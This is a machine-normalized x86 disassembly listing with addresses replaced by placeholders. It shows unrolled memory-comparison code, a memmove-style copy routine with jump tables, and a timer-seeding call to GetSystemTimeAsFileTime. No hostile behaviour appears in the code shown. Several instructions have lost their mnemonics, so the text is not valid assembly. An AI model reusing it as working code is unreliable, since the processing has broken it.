jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_10026f10
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10026f98 ]
jmp [ ecx * 4 + jump_table_10027018 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10027084 ]
pop esi
pop edi
pop ebp
jmp sub_10030168
jmp [ ecx * 4 + jump_table_10027220 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10027124 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10027220 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10027084 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10027220 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10027084 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10027084 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10027084 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10027220 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10027220 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10027220 ]
sub_10027275
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
push 0x1
push 0x0
push 0x0
push [ ebp - 0x4 ]
call sub_1002b270
mov ecx [ ebp - 0x8 ]
xor esi esi
add eax ecx
adc edx esi
mov [ rw-data ] eax
mov [ rw-data ] edx
xor eax eax
pop esi
leave
retn
sub_100272ae
push 0xc
push r--data
call sub_1002ca38
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
